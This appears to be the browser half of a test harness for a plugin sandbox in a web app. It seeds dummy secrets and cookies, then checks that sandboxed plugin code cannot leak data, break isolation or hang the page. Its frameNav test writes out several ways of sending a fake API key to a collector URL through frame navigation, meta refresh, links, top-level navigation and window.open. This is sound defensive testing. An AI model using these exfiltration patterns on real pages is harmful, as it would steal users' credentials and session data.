/**
 * scripts/sandbox-check.ts 在浏览器里调的那一半:网站页面这边开沙箱、递插件代码、记结果。
 * 打包成一个文件由检查脚本的假网站发出去;每项返回能直接 JSON 化的结果,判过没过在 Node 那边。
 */
import { frameCsp, SANDBOX_FLAGS } from '../../../src/plugin/protocol';
import { SandboxStopped, startPluginSandbox, type PluginSandbox, type StopReason } from '../../../src/plugin/sandbox';

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const reasonOf = (e: unknown) => (e instanceof SandboxStopped ? e.reason : `not stopped: ${String(e)}`);

/** 网站页面在这两个频道上听着,插件喊话被听到就算漏 */
const heard: unknown[] = [];
for (const name of ['civ-atlas', 'civ-atlas-check']) new BroadcastChannel(name).onmessage = (e) => heard.push(e.data);

async function seed() {
  localStorage.setItem('civ-atlas:ai-secrets', '{"deepseek":"sk-CHECK-SECRET"}');
  document.cookie = 'session=CHECK-COOKIE';
  await new Promise<void>((res, rej) => {
    const r = indexedDB.open('civ-atlas-check-vault', 1);
    r.onupgradeneeded = () => r.result.createObjectStore('manifests');
    r.onsuccess = () => {
      const tx = r.result.transaction('manifests', 'readwrite');
      tx.objectStore('manifests').put({ title: 'CHECK-WORLD' }, 'w1');
      tx.oncomplete = () => res();
      tx.onerror = () => rej(tx.error);
    };
    r.onerror = () => rej(r.error);
  });
  return 'seeded';
}

/** 插件在沙箱里把坏事试一遍 */
async function battery(code: string) {
  heard.length = 0;
  let done: (v: unknown) => void = () => {};
  const got = new Promise((r) => (done = r));
  const t0 = performance.now();
  const sb = await startPluginSandbox(code, { onMessage: (d) => (d as { type?: string })?.type === 'results' && done(d) });
  const readyMs = Math.round(performance.now() - t0);
  const out = await Promise.race([got, sleep(90_000).then(() => ({ type: 'timeout' }))]);
  await sleep(300);
  const stoppedBefore = sb.stopped;
  sb.stop();
  await sleep(300);
  return { readyMs, stoppedBefore, out, heard: heard.slice(), frames: document.querySelectorAll('iframe').length };
}

/** 一来一回、转交 36k 个数 */
async function echo() {
  const msgs: unknown[] = [];
  const sb = await startPluginSandbox(
    "civAtlas.post('early'); civAtlas.onCall((d) => { let s = 0; for (const x of d.a) s += x; return { s, n: d.a.length, back: d.a }; });",
    { onMessage: (d) => msgs.push(d) },
  );
  const a = new Float32Array(36_000).fill(1);
  const t0 = performance.now();
  const r = (await sb.call({ a }, { transfer: [a.buffer] })) as { s: number; n: number; back: Float32Array };
  const ms = performance.now() - t0;
  let thrown = '';
  try {
    await sb.call('x', { timeoutMs: 2000 });
  } catch (e) {
    thrown = e instanceof Error ? e.message : String(e);
  }
  let uncloneable = '';
  try {
    await sb.call({ f: () => 1 });
  } catch (e) {
    uncloneable = `${(e as Error).name}, ${sb.stopped ?? 'still running'}`;
  }
  await sb.ping();
  sb.stop();
  await sleep(300);
  return {
    s: r.s,
    n: r.n,
    backIsArray: r.back instanceof Float32Array && r.back.length === 36_000,
    detached: a.byteLength === 0,
    ms: +ms.toFixed(1),
    errorReply: thrown,
    uncloneable,
    early: msgs[0] === 'early',
    stopped: sb.stopped,
    afterStop: await sb.call('x').then(
      () => 'replied',
      (e) => reasonOf(e),
    ),
    frames: document.querySelectorAll('iframe').length,
  };
}

/** 两个插件各在各的来源:B 的频道喊话 A 听不到 */
async function isolation() {
  heard.length = 0;
  const aHeard: unknown[] = [];
  const a = await startPluginSandbox(
    "const c = new BroadcastChannel('civ-atlas-check'); c.onmessage = (e) => civAtlas.post(e.data); civAtlas.onCall(() => { new BroadcastChannel('civ-atlas-check').postMessage('from-a-itself'); return 'ok'; });",
    { onMessage: (d) => aHeard.push(d) },
  );
  const b = await startPluginSandbox("civAtlas.onCall(() => { new BroadcastChannel('civ-atlas-check').postMessage('from-b'); return 'ok'; });");
  await a.call(1);
  await b.call(1);
  await sleep(500);
  a.stop();
  b.stop();
  return { aHeard, hostHeard: heard.slice() };
}

async function expectStop(code: string, opts: { startTimeoutMs?: number } = {}, after?: (sb: PluginSandbox) => Promise<unknown>) {
  const t0 = performance.now();
  let reason: StopReason | string = '';
  let detail = '';
  try {
    const sb = await startPluginSandbox(code, {
      ...opts,
      onStop: (r, d) => {
        reason = r;
        detail = d;
      },
    });
    if (after) await after(sb).catch(() => {});
    await sleep(1500);
    if (!reason) {
      reason = sb.stopped ?? 'still running';
      sb.stop();
    }
  } catch (e) {
    reason = reasonOf(e);
    detail = e instanceof SandboxStopped ? e.detail : '';
  }
  await sleep(200);
  return { reason, detail: detail.slice(0, 120), ms: Math.round(performance.now() - t0), frames: document.querySelectorAll('iframe').length };
}

const stops = {
  syntax: () => expectStop('this is not javascript ((('),
  throwLater: () => expectStop("setTimeout(() => { throw new Error('boom'); }, 50);"),
  garbage: () => expectStop("setTimeout(() => postMessage('garbage'), 50);"),
  forgedBoot: () => expectStop("setTimeout(() => postMessage({ from: 'boot', kind: 'error', message: 'forged' }), 50);"),
  wrongVersion: () => expectStop("setTimeout(() => postMessage({ v: 99, kind: 'post', data: 1 }), 50);"),
  strayReply: () => expectStop("setTimeout(() => postMessage({ v: 1, kind: 'reply', id: 12345, ok: true, data: 1 }), 50);"),
  topLevelLoop: () => expectStop('for (;;) {}', { startTimeoutMs: 1500 }),
  pingLoop: () => expectStop('setTimeout(() => { for (;;) {} }, 100);', {}, async (sb) => (await sleep(300), sb.ping(1000))),
};

/** 死循环:界面照常、call 超时后停掉;CPU 降没降在 Node 那边量 */
let spinning: Promise<unknown> | null = null;
async function spinStart() {
  const sb = await startPluginSandbox('civAtlas.onCall(() => { for (;;) {} });');
  await sb.ping();
  let maxGap = 0;
  let last = performance.now();
  const tick = setInterval(() => {
    const now = performance.now();
    maxGap = Math.max(maxGap, now - last);
    last = now;
  }, 10);
  const t0 = performance.now();
  spinning = sb.call('spin', { timeoutMs: 2500 }).then(
    () => ({ reason: 'replied' }),
    (e) => {
      clearInterval(tick);
      return { reason: reasonOf(e), stopped: sb.stopped, maxGapMs: Math.round(maxGap), stopAfterMs: Math.round(performance.now() - t0) };
    },
  );
  return 'spinning';
}
const spinWait = () => spinning;

/** 框的页面里跑的代码(模拟插件跑出了线程、或引导代码被人改坏):用和沙箱一样的属性和内容安全策略,只是放行的散列换成这段代码的 */
async function rawFrame(script: string): Promise<HTMLIFrameElement> {
  const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(script));
  const hash = btoa(String.fromCharCode(...new Uint8Array(digest)));
  const f = document.createElement('iframe');
  f.setAttribute('sandbox', SANDBOX_FLAGS);
  f.srcdoc = `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${frameCsp(`'sha256-${hash}'`)}"></head><body><script>${script}</script></body></html>`;
  document.body.append(f);
  return f;
}

/** 框自己跳走、带走数据:几种跳法各开一个框 */
async function frameNav(collect: string) {
  const ways: Record<string, string> = {
    self: `location.href = '${collect}/nav-self?d=sk-CHECK-SECRET';`,
    refresh: `const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${collect}/nav-refresh'; document.head.append(m);`,
    link: `const a = document.createElement('a'); a.href = '${collect}/nav-link'; document.body.append(a); a.click();`,
    top: `top.location.href = '${collect}/nav-top';`,
    open: `window.open('${collect}/nav-open');`,
  };
  const ran: string[] = [];
  const frames: HTMLIFrameElement[] = [];
  const on = (e: MessageEvent) => {
    if (typeof e.data === 'string' && e.data.startsWith('ran:')) ran.push(e.data.slice(4));
  };
  addEventListener('message', on);
  for (const [k, code] of Object.entries(ways)) {
    frames.push(await rawFrame(`parent.postMessage('ran:${k}', '*'); setTimeout(() => { try { ${code} } catch (e) { parent.postMessage('ran:${k} threw ' + e.name, '*'); } }, 50);`));
  }
  await sleep(2000);
  removeEventListener('message', on);
  frames.forEach((f) => f.remove());
  return { ran: ran.sort() };
}

/** 对照:插件代码直接跑在框的页面里(少了线程那一层) */
async function frameBattery(code: string) {
  const f = await rawFrame(code);
  return new Promise((res) => {
    const on = (e: MessageEvent) => {
      if (e.source !== f.contentWindow || (e.data as { type?: string })?.type !== 'results') return;
      removeEventListener('message', on);
      f.remove();
      res(e.data);
    };
    addEventListener('message', on);
    setTimeout(() => res({ type: 'timeout' }), 90_000);
  });
}

/** 对照:网站自己开的线程连得出去(收信站这时候必须收到,证明它听得见) */
async function siteWorker(collect: string) {
  const code = `fetch('${collect}/site-worker').then((r) => postMessage('ok ' + r.status), (e) => postMessage('err ' + e.message));`;
  const w = new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })));
  return new Promise((res) => {
    w.onmessage = (e) => {
      w.terminate();
      res(e.data);
    };
    setTimeout(() => res('timeout'), 5000);
  });
}

const check = { seed, battery, echo, isolation, stops, spinStart, spinWait, frameNav, frameBattery, siteWorker };
(window as unknown as { check: typeof check }).check = check;
(window as unknown as { ready: boolean }).ready = true;
